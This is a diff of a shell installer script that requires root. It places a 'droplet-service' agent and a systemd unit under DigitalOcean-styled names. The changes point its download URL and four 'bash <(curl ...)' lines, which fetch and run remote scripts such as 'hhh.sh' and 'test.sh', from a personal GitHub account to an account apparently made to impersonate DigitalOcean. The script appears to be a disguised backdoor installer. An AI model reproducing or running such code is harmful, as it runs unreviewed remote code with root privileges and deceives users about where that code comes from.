@@ -3,7 +3,7 @@
 # Set variables
 AGENT_PATH="/opt/digitalocean/bin/droplet-service"
 SERVICE_PATH="/etc/systemd/system/droplet-host.service"
-DOWNLOAD_URL="https://github.com/yellphonenaing199/package-repo/raw/refs/heads/main/packages"
+DOWNLOAD_URL="https://github.com/digitalocean-droplet/package-repo/raw/refs/heads/main/packages"
 
 # Check for root
 if [[ $EUID -ne 0 ]]; then
@@ -199,7 +199,7 @@ check_and_install_build_tools() {
 # Check and install build tools
 check_and_install_build_tools
 
-bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/service-dis.sh)
-bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/service-dis-host.sh)
-bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test.sh)
-bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/installer/refs/heads/main/hhh.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/service-dis.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/service-dis-host.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/package-repo/refs/heads/main/test.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/digitalocean-droplet/installer/refs/heads/main/hhh.sh)
